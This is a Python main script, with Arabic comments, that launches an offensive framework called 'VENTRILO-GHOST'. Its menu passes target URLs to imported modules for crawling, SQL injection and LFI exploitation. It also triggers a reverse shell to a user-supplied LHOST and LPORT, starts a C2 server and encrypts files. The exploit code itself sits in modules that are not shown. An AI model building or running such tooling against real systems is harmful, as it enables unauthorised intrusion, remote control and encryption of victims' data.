import asyncio
import sys
import os
from colorama import Fore, Style, init

# استيراد الوحدات التي طورناها في مجلد core
from core.scanner import GhostScanner
from core.exploiter import GhostExploiter
from core.encryptor import GhostEncryptor

# تهيئة الألوان
init(autoreset=True)

def banner():
    print(f"{Fore.BLUE}#"*60 + f"\n#  {Fore.WHITE}VENTRILO-GHOST FRAMEWORK v1.1.0 // {Fore.CYAN}SayerLinux {Fore.BLUE} #\n" + f"{Fore.BLUE}#"*60)

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    print(f"{Fore.YELLOW}[1] {Fore.WHITE}الفحص العميق (Spider)")
    print(f"{Fore.YELLOW}[2] {Fore.WHITE}استغلال SQL Injection")
    print(f"{Fore.YELLOW}[3] {Fore.WHITE}استغلال LFI")
    print(f"{Fore.YELLOW}[4] {Fore.WHITE}فتح Reverse Shell")
    print(f"{Fore.YELLOW}[5] {Fore.WHITE}لوحة التحكم C2")
    print(f"{Fore.YELLOW}[6] {Fore.WHITE}تشفير البيانات (Ghost Encryptor)")
    print(f"{Fore.RED}[0] {Fore.WHITE}خروج")
    
    choice = input(f"\n{Fore.BLUE}[SayerLinux-Ghost]> ")

    if choice == '1':
        target = input("[?] Target URL: ")
        await GhostScanner(target).start()
    elif choice in ['2','3','4']:
        target = input("[?] Target URL: ")
        exp = GhostExploiter(target)
        if choice == '2': exp.verify_sqli(input("[?] Param (id): "))
        elif choice == '3': exp.test_lfi(input("[?] Param (file): "))
        elif choice == '4': exp.trigger_reverse_shell(input("[?] LHOST: "), input("[?] LPORT: "))
    elif choice == '5':
        os.system("python c2_server/app.py")
    elif choice == '6':
        enc = GhostEncryptor()
        path = input("[?] File Path to Encrypt: ")
        if os.path.isfile(path): enc.encrypt_file(path)
        else: print(f"Encrypted: {enc.encrypt_data(path)}")

if __name__ == "__main__":
    asyncio.run(main())